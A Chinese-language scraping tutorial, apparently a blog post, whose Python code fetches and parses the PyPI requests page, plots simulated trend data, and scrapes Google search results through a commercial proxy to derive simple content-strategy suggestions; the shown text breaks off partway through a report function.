<p>在技术领域，及时掌握开源项目的动态变化至关重要。以 PyPI 上的 requests 库为例，作为 Python 生态系统中最常用的 HTTP 库之一，其版本更新、发布频率和功能变化直接影响着成千上万个项目的技术选型和升级决策。</p>
<p>通过这个抓取 PyPI requests 包的示例，我们将展示如何从简单的网页抓取开始，构建一个完整的技术监控方案，为技术决策提供坚实的数据基础。</p>
<h3 data-id="heading-7">获取 PyPI 页面 HTML</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># PyPI requests 包页面</span>
url = <span class="hljs-string">"https://pypi.org/project/requests/"</span>
headers = {
    <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "</span>
                  <span class="hljs-string">"(KHTML, like Gecko) Chrome/124.0 Safari/537.36"</span>
}

<span class="hljs-comment"># 抓取 HTML</span>
resp = requests.get(url, headers=headers, timeout=<span class="hljs-number">10</span>)
html = resp.text

<span class="hljs-built_in">print</span>(<span class="hljs-string">"页面抓取完成，HTML 长度："</span>, <span class="hljs-built_in">len</span>(html))
</code></pre>
<blockquote>
<p><strong>说明</strong>：</p>
<ul>
<li>抓取 PyPI <code>requests</code> 页面 HTML。</li>
<li>后续解析 JSON 都会用到 <code>html</code> 变量，因此必须先执行这一段。</li>
<li>用途：让开发者或产品分析师快速获取包信息、版本变化和发布时间趋势</li>
</ul>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ebdfde17b8040be9cc854c526277617~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=9yTmHRWl%2B3Q8vVF2vhfe2IRxZ6o%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-8">解析 HTML 为结构化 JSON</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># PyPI requests 包页面</span>
url = <span class="hljs-string">"https://pypi.org/project/requests/"</span>
headers = {
    <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "</span>
                  <span class="hljs-string">"(KHTML, like Gecko) Chrome/124.0 Safari/537.36"</span>
}

<span class="hljs-comment"># 抓取 HTML</span>
resp = requests.get(url, headers=headers, timeout=<span class="hljs-number">10</span>)
html = resp.text

<span class="hljs-built_in">print</span>(<span class="hljs-string">"页面抓取完成，HTML 长度："</span>, <span class="hljs-built_in">len</span>(html))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_pypi</span>(<span class="hljs-params">html</span>):
    soup = BeautifulSoup(html, <span class="hljs-string">"html.parser"</span>)
    result = {<span class="hljs-string">"fetch_time"</span>: datetime.utcnow().isoformat(), <span class="hljs-string">"modules"</span>: []}

    <span class="hljs-comment"># 包名 + 版本</span>
    header = soup.select_one(<span class="hljs-string">"h1.package-header__name"</span>)
    <span class="hljs-keyword">if</span> header:
        text = header.text.strip()
        <span class="hljs-keyword">if</span> <span class="hljs-string">" "</span> <span class="hljs-keyword">in</span> text:
            name, version = text.split(<span class="hljs-string">" "</span>, <span class="hljs-number">1</span>)
            result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>: <span class="hljs-string">"package_name"</span>, <span class="hljs-string">"value"</span>: name})
            result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>: <span class="hljs-string">"version"</span>, <span class="hljs-string">"value"</span>: version})
        <span class="hljs-keyword">else</span>:
            result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>: <span class="hljs-string">"package_name"</span>, <span class="hljs-string">"value"</span>: text})

    <span class="hljs-comment"># 发布时间</span>
    time_tag = soup.select_one(<span class="hljs-string">"time"</span>)
    <span class="hljs-keyword">if</span> time_tag:
        result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>: <span class="hljs-string">"release_date"</span>, <span class="hljs-string">"value"</span>: time_tag.get(<span class="hljs-string">"datetime"</span>)})

    <span class="hljs-comment"># 项目描述</span>
    desc_tag = soup.select_one(<span class="hljs-string">"p.package-description__summary"</span>)
    <span class="hljs-keyword">if</span> desc_tag:
        result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>: <span class="hljs-string">"description"</span>, <span class="hljs-string">"value"</span>: desc_tag.text.strip()})

    <span class="hljs-keyword">return</span> result

parsed_day1 = parse_pypi(html)

<span class="hljs-comment"># 输出 JSON</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"解析完成，JSON 内容："</span>)
<span class="hljs-built_in">print</span>(json.dumps(parsed_day1, indent=<span class="hljs-number">2</span>, ensure_ascii=<span class="hljs-literal">False</span>))
</code></pre>
<blockquote>
<p><strong>说明</strong>：</p>
<ul>
<li>将 HTML 解析成结构化 JSON。</li>
<li>包含模块：<code>package_name</code>、<code>version</code>、<code>release_date</code>、<code>description</code>。</li>
<li>方便统计模块数量、生成趋势分析和可视化报告</li>
</ul>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa3ac8a25d90417eb363e16832150800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=W2qQcry1Qe2DKb%2BU0TICk%2ByYXyc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">模拟 8 天趋势数据</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter

<span class="hljs-comment"># 模拟 8 天趋势</span>
trend_data = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
    day_modules = parsed_day1[<span class="hljs-string">"modules"</span>] + [{<span class="hljs-string">"type"</span>: <span class="hljs-string">"dummy"</span>, <span class="hljs-string">"value"</span>: j} <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i % <span class="hljs-number">4</span>)]
    trend_data.append({<span class="hljs-string">"modules"</span>: day_modules})

days = [<span class="hljs-string">"2025-11-"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">14</span> + i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]

<span class="hljs-comment"># 统计每种模块每天数量</span>
module_types = <span class="hljs-built_in">set</span>()
<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> trend_data:
    module_types.update([m[<span class="hljs-string">"type"</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> d[<span class="hljs-string">"modules"</span>]])
module_types = <span class="hljs-built_in">list</span>(module_types)

trend_counts = {
    t: [Counter([m[<span class="hljs-string">"type"</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> d[<span class="hljs-string">"modules"</span>]]).get(t, <span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> trend_data]
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> module_types
}

<span class="hljs-comment"># 打印每日模块统计</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== 每日模块统计 ==="</span>)
<span class="hljs-keyword">for</span> t, counts <span class="hljs-keyword">in</span> trend_counts.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{t}</span>: <span class="hljs-subst">{counts}</span>"</span>)
</code></pre>
<p>说明：</p>
<ul>
<li><code>dummy</code> 数据仅用于演示趋势折线图</li>
<li>方便快速判断哪些模块信息在变化，有助于内容更新策略或竞争分析</li>
<li>实际使用中可换为每日抓取的真实数据</li>
</ul>
<hr/>
<h3 data-id="heading-10">绘制趋势折线图</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt

<span class="hljs-keyword">for</span> t, counts <span class="hljs-keyword">in</span> trend_counts.items():
    plt.plot(days, counts, marker=<span class="hljs-string">'o'</span>, label=t)

plt.title(<span class="hljs-string">"PyPI requests 包信息模块趋势（模拟 8 天）"</span>)
plt.xlabel(<span class="hljs-string">"日期"</span>)
plt.ylabel(<span class="hljs-string">"模块数量"</span>)
plt.legend()
plt.xticks(rotation=<span class="hljs-number">45</span>)
plt.tight_layout()
plt.show()
</code></pre>
<p>说明：</p>
<ul>
<li>折线图显示每日各模块数量变化</li>
<li>便于观察趋势和异常</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0881e3ab407547a7a62a0cf67112269c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=bUt%2FJGmX00KEzCDH6ON0OBD6JIs%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-11">完整整合版（可直接运行）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt

<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-comment"># 3.1 抓取 HTML</span>
<span class="hljs-comment"># -----------------------------</span>
url = <span class="hljs-string">"https://pypi.org/project/requests/"</span>
headers = {<span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "</span>
                         <span class="hljs-string">"(KHTML, like Gecko) Chrome/124.0 Safari/537.36"</span>}
resp = requests.get(url, headers=headers, timeout=<span class="hljs-number">10</span>)
html = resp.text

<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-comment"># 3.2 解析 HTML</span>
<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_pypi</span>(<span class="hljs-params">html</span>):
    soup = BeautifulSoup(html, <span class="hljs-string">"html.parser"</span>)
    result = {<span class="hljs-string">"fetch_time"</span>: datetime.utcnow().isoformat(), <span class="hljs-string">"modules"</span>: []}
    header = soup.select_one(<span class="hljs-string">"h1.package-header__name"</span>)
    <span class="hljs-keyword">if</span> header:
        text = header.text.strip()
        <span class="hljs-keyword">if</span> <span class="hljs-string">" "</span> <span class="hljs-keyword">in</span> text:
            name, version = text.split(<span class="hljs-string">" "</span>, <span class="hljs-number">1</span>)
            result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>:<span class="hljs-string">"package_name"</span>,<span class="hljs-string">"value"</span>:name})
            result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>:<span class="hljs-string">"version"</span>,<span class="hljs-string">"value"</span>:version})
        <span class="hljs-keyword">else</span>:
            result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>:<span class="hljs-string">"package_name"</span>,<span class="hljs-string">"value"</span>:text})
    time_tag = soup.select_one(<span class="hljs-string">"time"</span>)
    <span class="hljs-keyword">if</span> time_tag: result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>:<span class="hljs-string">"release_date"</span>,<span class="hljs-string">"value"</span>:time_tag.get(<span class="hljs-string">"datetime"</span>)})
    desc_tag = soup.select_one(<span class="hljs-string">"p.package-description__summary"</span>)
    <span class="hljs-keyword">if</span> desc_tag: result[<span class="hljs-string">"modules"</span>].append({<span class="hljs-string">"type"</span>:<span class="hljs-string">"description"</span>,<span class="hljs-string">"value"</span>:desc_tag.text.strip()})
    <span class="hljs-keyword">return</span> result

parsed_day1 = parse_pypi(html)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"解析完成 JSON："</span>)
<span class="hljs-built_in">print</span>(json.dumps(parsed_day1, indent=<span class="hljs-number">2</span>, ensure_ascii=<span class="hljs-literal">False</span>))

<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-comment"># 3.3 模拟 8 天趋势</span>
<span class="hljs-comment"># -----------------------------</span>
trend_data = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
    day_modules = parsed_day1[<span class="hljs-string">"modules"</span>] + [{<span class="hljs-string">"type"</span>:<span class="hljs-string">"dummy"</span>,<span class="hljs-string">"value"</span>:j} <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i % <span class="hljs-number">4</span>)]
    trend_data.append({<span class="hljs-string">"modules"</span>: day_modules})

days = [<span class="hljs-string">"2025-11-"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">14</span> + i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]

<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-comment"># 3.4 模块统计</span>
<span class="hljs-comment"># -----------------------------</span>
module_types = <span class="hljs-built_in">set</span>()
<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> trend_data: module_types.update([m[<span class="hljs-string">"type"</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> d[<span class="hljs-string">"modules"</span>]])
module_types = <span class="hljs-built_in">list</span>(module_types)
trend_counts = {t:[Counter([m[<span class="hljs-string">"type"</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> d[<span class="hljs-string">"modules"</span>]]).get(t,<span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> trend_data] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> module_types}

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 每日模块统计 ==="</span>)
<span class="hljs-keyword">for</span> t, counts <span class="hljs-keyword">in</span> trend_counts.items(): <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{t}</span>: <span class="hljs-subst">{counts}</span>"</span>)

<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-comment"># 3.5 绘制趋势图</span>
<span class="hljs-comment"># -----------------------------</span>
<span class="hljs-keyword">for</span> t, counts <span class="hljs-keyword">in</span> trend_counts.items(): plt.plot(days, counts, marker=<span class="hljs-string">'o'</span>, label=t)
plt.title(<span class="hljs-string">"PyPI requests 包信息模块趋势（模拟 8 天）"</span>)
plt.xlabel(<span class="hljs-string">"日期"</span>)
plt.ylabel(<span class="hljs-string">"模块数量"</span>)
plt.legend()
plt.xticks(rotation=<span class="hljs-number">45</span>)
plt.tight_layout()
plt.show()
</code></pre>
<h2 data-id="heading-12">实操示例 2：SERP 模块分析指导内容策略</h2>
<p>在内容营销竞争日益激烈的当下，众多内容团队面临着共同的困境：如何在有限的预算内，为不同的产品线制定最有效的内容策略？</p>
<p>为此，我制作了这款比较简易的 SERP 模块分析指导内容策略系统。通过深度解析 Google 搜索结果页面的结构化特征，将主观的经验判断转化为客观的数据分析，为不同产品线提供精准的内容创作方向，让每一份投入都产生可衡量的商业价值。</p>
<h3 data-id="heading-13">获取同一公司多产品线的 SERP 数据</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># 配置IPIDEA代理</span>
proxy_url = <span class="hljs-string">"http://YOUR_USERNAME:YOUR_PASSWORD@proxy.ipidea.io:2333"</span>
proxies = {<span class="hljs-string">"http"</span>: proxy_url, <span class="hljs-string">"https"</span>: proxy_url}

headers = {
    <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
}

<span class="hljs-comment"># 同一科技公司的 5个不同产品线关键词（最新款）</span>
keywords = [
    <span class="hljs-string">"iPhone 17 Pro review"</span>,               <span class="hljs-comment"># 旗舰产品评测</span>
    <span class="hljs-string">"MacBook Air M4 unboxing"</span>,            <span class="hljs-comment"># 开箱体验类</span>
    <span class="hljs-string">"iPad Pro 2025 buying guide"</span>,         <span class="hljs-comment"># 购买指南类  </span>
    <span class="hljs-string">"Apple Watch Series 11 setup tutorial"</span>, <span class="hljs-comment"># 使用教程类</span>
    <span class="hljs-string">"AirPods Pro 4 vs Bose comparison"</span>    <span class="hljs-comment"># 竞品对比类</span>
]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_serp_html</span>(<span class="hljs-params">keyword</span>):
    <span class="hljs-string">"""使用IPIDEA代理获取Google搜索结果"""</span>
    url = <span class="hljs-string">f"https://www.google.com/search?q=<span class="hljs-subst">{requests.utils.quote(keyword)}</span>&amp;gl=us&amp;num=10"</span>
    <span class="hljs-keyword">try</span>:
        resp = requests.get(url, headers=headers, proxies=proxies, timeout=<span class="hljs-number">15</span>)
        <span class="hljs-keyword">return</span> resp.text <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   请求失败: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 批量获取SERP数据并实时输出进度</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"开始使用IPIDEA代理采集SERP数据..."</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"代理配置:"</span>, proxy_url)
serp_html_data = {}
<span class="hljs-keyword">for</span> i, keyword <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(keywords, <span class="hljs-number">1</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[<span class="hljs-subst">{i}</span>/<span class="hljs-subst">{<span class="hljs-built_in">len</span>(keywords)}</span>] 正在获取: <span class="hljs-subst">{keyword}</span>"</span>)
    
    html = get_serp_html(keyword)
    <span class="hljs-keyword">if</span> html:
        serp_html_data[keyword] = html
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   成功获取 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(html)}</span> 字符的HTML"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   获取失败，请检查代理配置"</span>)
    
    time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 添加延时避免请求过快</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n数据采集完成！共成功获取 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(serp_html_data)}</span>/<span class="hljs-subst">{<span class="hljs-built_in">len</span>(keywords)}</span> 个关键词的SERP数据"</span>)

<span class="hljs-comment"># 显示采集结果摘要</span>
<span class="hljs-keyword">if</span> serp_html_data:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n采集结果摘要:"</span>)
    <span class="hljs-keyword">for</span> keyword, html <span class="hljs-keyword">in</span> serp_html_data.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   • <span class="hljs-subst">{keyword}</span>: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(html)}</span> 字符"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"未获取到任何数据，请检查IPIDEA代理配置"</span>)
</code></pre>
<p><strong>实际输出：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6363b06082f24d27965920254e592ee0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=66nuDJsY4z7L%2FJccOUBsM%2Bj0pg8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><strong>说明：</strong></p>
<ul>
<li>包含最新款产品的评测、开箱、购买指南、使用教程、竞品对比等搜索意图</li>
<li>实时输出采集进度和结果，便于监控执行状态</li>
<li>添加请求延时防止反爬机制</li>
</ul>
<hr/>
<h3 data-id="heading-14">解析 SERP 结构并生成产品线内容策略</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_serp_structure</span>(<span class="hljs-params">html, keyword</span>):
    <span class="hljs-string">"""分析SERP结构并生成内容策略建议"""</span>
    html_lower = html.lower()
    
    <span class="hljs-comment"># 简化的SERP模块分析</span>
    modules = {
        <span class="hljs-string">"ads"</span>: <span class="hljs-built_in">min</span>(html.count(<span class="hljs-string">'Ad'</span>), <span class="hljs-number">10</span>),  <span class="hljs-comment"># 广告数量</span>
        <span class="hljs-string">"shopping"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'shop'</span>, <span class="hljs-string">'buy'</span>, <span class="hljs-string">'price'</span>]),
        <span class="hljs-string">"videos"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'youtube'</span>, <span class="hljs-string">'video'</span>, <span class="hljs-string">'watch'</span>]),
        <span class="hljs-string">"news"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'news'</span>, <span class="hljs-string">'latest'</span>, <span class="hljs-string">'update'</span>]),
        <span class="hljs-string">"questions"</span>: <span class="hljs-built_in">min</span>(html_lower.count(<span class="hljs-string">'?'</span>), <span class="hljs-number">10</span>),  <span class="hljs-comment"># 相关问题</span>
        <span class="hljs-string">"featured_snippet"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'snippet'</span>, <span class="hljs-string">'answer'</span>]),
        <span class="hljs-string">"comparison"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'vs'</span>, <span class="hljs-string">'compare'</span>, <span class="hljs-string">'comparison'</span>])
    }
    
    <span class="hljs-comment"># 生成内容策略</span>
    strategies = generate_content_strategy(modules, keyword)
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"keyword"</span>: keyword,
        <span class="hljs-string">"modules"</span>: modules,
        <span class="hljs-string">"strategies"</span>: strategies
    }

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_content_strategy</span>(<span class="hljs-params">modules, keyword</span>):
    <span class="hljs-string">"""基于SERP模块分析生成内容策略"""</span>
    strategies = []
    
    <span class="hljs-comment"># 商业价值判断</span>
    <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"ads"</span>] &gt;= <span class="hljs-number">3</span>:
        strategies.append(<span class="hljs-string">"制作购买指南和产品对比"</span>)
    <span class="hljs-keyword">elif</span> modules[<span class="hljs-string">"ads"</span>] &gt; <span class="hljs-number">0</span>:
        strategies.append(<span class="hljs-string">"制作评测和推荐内容"</span>)
    
    <span class="hljs-comment"># 内容类型建议</span>
    <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"shopping"</span>]:
        strategies.append(<span class="hljs-string">"创建产品评测和购买建议"</span>)
    <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"videos"</span>]:
        strategies.append(<span class="hljs-string">"投资视频开箱或评测内容"</span>)
    <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"questions"</span>] &gt; <span class="hljs-number">3</span>:
        strategies.append(<span class="hljs-string">"制作FAQ解答用户问题"</span>)
    <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"featured_snippet"</span>]:
        strategies.append(<span class="hljs-string">"优化内容争取精选摘要"</span>)
    <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"comparison"</span>]:
        strategies.append(<span class="hljs-string">"制作详细竞品对比分析"</span>)
    
    <span class="hljs-comment"># 关键词类型建议</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">"review"</span> <span class="hljs-keyword">in</span> keyword:
        strategies.append(<span class="hljs-string">"创建深度产品评测内容"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"unboxing"</span> <span class="hljs-keyword">in</span> keyword:
        strategies.append(<span class="hljs-string">"制作开箱视频和第一印象"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"buying guide"</span> <span class="hljs-keyword">in</span> keyword:
        strategies.append(<span class="hljs-string">"制作购买建议和配置推荐"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"setup"</span> <span class="hljs-keyword">in</span> keyword <span class="hljs-keyword">or</span> <span class="hljs-string">"tutorial"</span> <span class="hljs-keyword">in</span> keyword:
        strategies.append(<span class="hljs-string">"制作详细设置教程"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"vs"</span> <span class="hljs-keyword">in</span> keyword <span class="hljs-keyword">or</span> <span class="hljs-string">"comparison"</span> <span class="hljs-keyword">in</span> keyword:
        strategies.append(<span class="hljs-string">"制作功能对比表格"</span>)
    
    <span class="hljs-keyword">return</span> strategies <span class="hljs-keyword">if</span> strategies <span class="hljs-keyword">else</span> [<span class="hljs-string">"📝 创建综合信息内容"</span>]

<span class="hljs-comment"># 分析SERP数据并实时显示分析结果</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"开始SERP结构分析..."</span>)

serp_analyses = {}
<span class="hljs-keyword">for</span> keyword, html <span class="hljs-keyword">in</span> serp_html_data.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n分析关键词: <span class="hljs-subst">{keyword}</span>"</span>)
    analysis = analyze_serp_structure(html, keyword)
    serp_analyses[keyword] = analysis
    
    <span class="hljs-comment"># 立即显示分析结果</span>
    modules = analysis[<span class="hljs-string">"modules"</span>]
    active_modules = []
    <span class="hljs-keyword">for</span> module, value <span class="hljs-keyword">in</span> modules.items():
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value &gt; <span class="hljs-number">0</span>:
            active_modules.append(<span class="hljs-string">f"<span class="hljs-subst">{module}</span>(<span class="hljs-subst">{value}</span>)"</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   检测到模块: <span class="hljs-subst">{<span class="hljs-string">', '</span>.join(active_modules) <span class="hljs-keyword">if</span> active_modules <span class="hljs-keyword">else</span> <span class="hljs-string">'基础搜索结果'</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   策略建议: <span class="hljs-subst">{<span class="hljs-string">', '</span>.join(analysis[<span class="hljs-string">'strategies'</span>][:<span class="hljs-number">3</span>])}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nSERP分析完成！共分析 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(serp_analyses)}</span> 个关键词"</span>)
</code></pre>
<p><strong>实际输出：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22abdc82ff4744ce894b0ae8ebaf4f8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=XROj%2FUuIH119YNYz2D%2B3qsSE%2F%2B0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><strong>说明：</strong></p>
<ul>
<li>基于模块存在情况自动生成具体的内容策略</li>
<li>针对不同产品线关键词提供定制化建议</li>
<li>实时输出每个关键词的分析结果，便于即时了解分析进展</li>
</ul>
<hr/>
<h3 data-id="heading-15">生成内容策略报告</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_content_strategy_report</span>(<span class="hljs-params">analyses</span>):
    <span class="hljs-string">"""生成内容策略报告"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"SERP模块分析 - 内容策略报告"</span>)
    
    <span class="hljs-keyword">for</span> keyword, analysis <span class="hljs-keyword">in</span> analyses.items():
        modules = analysis[<span class="hljs-string">"modules"</span>]
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n关键词: <span class="hljs-subst">{keyword}</span>"</span>)
        
        <span class="hljs-comment"># 显示发现的模块</span>
        active_modules = []
        <span class="hljs-keyword">for</span> module, value <span class="hljs-keyword">in</span> modules.items():
            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value &gt; <span class="hljs-number">0</span>:
                display_name = {
                    <span class="hljs-string">"ads"</span>: <span class="hljs-string">f"广告(<span class="hljs-subst">{value}</span>)"</span>,
                    <span class="hljs-string">"shopping"</span>: <span class="hljs-string">"购物模块"</span>,
                    <span class="hljs-string">"videos"</span>: <span class="hljs-string">"视频模块"</span>, 
                    <span class="hljs-string">"news"</span>: <span class="hljs-string">"新闻模块"</span>,
